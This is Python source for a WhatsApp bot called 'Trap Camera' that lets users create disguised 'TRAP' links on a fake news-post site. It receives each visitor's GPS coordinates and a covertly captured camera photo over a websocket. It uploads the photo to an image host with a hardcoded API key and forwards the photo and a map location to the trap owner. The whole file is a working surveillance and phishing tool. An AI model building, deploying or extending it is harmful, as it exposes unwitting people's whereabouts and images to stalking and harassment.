import datetime
import os
import threading
import re
from requests import Session
from flask import Flask, request
import json
import asyncio
import websockets
from twilio.rest import Client

requests = Session()
account_sid = os.environ.get("ACCOUNT_SID")
auth_token = os.environ.get("AUTH_TOKEN")
client = Client(account_sid, auth_token)
email, password = os.environ.get("EMAIL"), os.environ.get("PASSWORD")
middlewaretoken = re.findall("name=\"csrfmiddlewaretoken\" value=\"(.*?)\">",requests.get("https://linuxnews.herokuapp.com/login").text)[0]
token = re.findall("token \= \"(.*?)\"", requests.post("https://linuxnews.herokuapp.com/login", data={"csrfmiddlewaretoken":middlewaretoken,"email":email, "password":password}).text)[0]
app = Flask(__name__)
def uploadImage(base64_, **kwargs):
    stat=requests.post("https://api.imgbb.com/1/upload?key=0c796ce6298f7c15296df06db9fcff86",data={"image":base64_, **kwargs})
    return stat.json()["data"]["url"]
def sendMessage(chat_id, x, y):
    client.messages.create(body='Trap Camera',from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}', persistent_action=[f'geo:{x},{y}|Lokasi Ditemukan'])
def sendImage(chat_id, url, pesan):
    client.messages.create(body=pesan, from_='whatsapp:+14155238886', to=f'whatsapp:+{chat_id}', media_url=url)
def getListUrl(chat_id):
    out = []
    result = requests.post("https://linuxnews.herokuapp.com/getUrl", data={"apikey":token}).json()
    for i in result:
        if i["name"] == chat_id:
            out.append(i)
    return out
def prettyMessageList(chat_id):
    text = ""
    listurl=getListUrl(chat_id=chat_id)
    if not listurl:
        return "Anda Belum Mempunya URL TRAP"
    for i in listurl:
        text+="{:<3}:{:<15}:{:<15}\n".format(i["id"], i["url"], f'https://linuxnews.herokuapp.com/post/{i["idpage"]}')
    return text.strip()
def pretyTRAP(js):
    text = ""
    for i in js.keys():
        text+="{:<15}:{:<15}\n".format(i, js[i])
    return text
def deleteUrl(chat_id, id_):
    for i in getListUrl(chat_id):
        if i["name"] == chat_id and int(i["id"]) == id_:
            return requests.post("https://linuxnews.herokuapp.com/deltrap", data={"token":token, 'id':id_}).json()["status"]
    else:
        return False

def addUrl(chat_id, url):
    return requests.post("https://linuxnews.herokuapp.com/addTrap", data={"token":token, "url":url, "name":chat_id}).json()["status"]

async def hello():
    while True:
        try:
            uri = "ws://linuxnews.herokuapp.com/ws"
            async with websockets.connect(uri) as websocket:
                print(await websocket.recv())
                await websocket.send(json.dumps({
                    "email":email,
                    "password":password
                }))
                print(await websocket.recv())
                while True:
                    greeting = json.loads(await websocket.recv())
                    chat_id = greeting.pop("trap_name")
                    x = greeting.pop("GeoLongitude")
                    y = greeting.pop("GeoLatitude")
                    greeting["GeoTimestamp"] = datetime.datetime.fromtimestamp(int(greeting["GeoTimestamp"])/1000).strftime("%a %h %Y, %r")
                    if "img" in greeting.keys():
                        sendImage(url=uploadImage(greeting.pop("img")[31:],expiration=60), chat_id=chat_id, pesan=pretyTRAP(greeting))
                        sendMessage(chat_id=chat_id, x=y, y=x)
                    else:
                        client.messages.create(
                            body=pretyTRAP(greeting),from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                        )
                        sendMessage(chat_id=chat_id, x=y, y=x)
        except websockets.exceptions.ConnectionClosedError:
            pass
@app.route("/", methods=["POST", "GET"])
def on_message_received():
    if request.method == "POST":
        Message = request.form.get("Body")
        chat_id = request.form.get("WaId")
        if Message and chat_id:
            perintah=Message.split()[0]
            if perintah == "create":
                url=Message[len("create")+1:]
                if addUrl(chat_id, url):
                    client.messages.create(
                    body="Sukses",from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                )
                else:
                    client.messages.create(
                    body="Gagal",from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                )
            elif perintah == "delete":
                id_=int(Message[len("delete")+1:])
                if deleteUrl(chat_id,id_):
                    client.messages.create(
                    body="Sukses",from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                )
                else:
                    client.messages.create(
                    body="Gagal",from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                )
            elif perintah == "list":
                client.messages.create(
                    body=prettyMessageList(chat_id),from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                )
            elif perintah == "help":
                help_ = """
create : create TRAP
list: show all all TRAP
delete: delete TRAP by id
                """
                client.messages.create(
                    body=help_.strip(),from_='whatsapp:+14155238886',to=f'whatsapp:+{chat_id}'
                )
    else:
        pass
    return "{}"


threading.Thread(target=app.run, args=(), kwargs={"host":"0.0.0.0", "port":os.environ.get("PORT", 5000)}).start()
asyncio.get_event_loop().run_until_complete(hello())